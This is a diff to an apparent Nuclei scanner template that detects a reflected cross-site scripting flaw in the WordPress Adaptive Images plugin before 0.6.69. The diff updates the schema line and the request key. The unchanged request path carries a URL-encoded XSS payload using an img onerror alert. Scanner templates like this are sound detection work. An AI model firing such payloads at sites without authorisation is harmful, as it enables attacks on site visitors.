@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: wp-adaptive-xss
 info:
   name: Adaptive Images < 0.6.69 - Reflected Cross-Site Scripting
@@ -8,7 +9,7 @@ info:
     - https://wpscan.com/vulnerability/eef137af-408c-481c-8493-afe6ee2105d0
     - https://plugins.trac.wordpress.org/changeset/2655683
   tags: wordpress,xss,wp-plugin,wp
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/wp-content/plugins/adaptive-images/adaptive-images-script.php/%3Cimg/src/onerror=alert(document.domain)%3E/?debug=true"
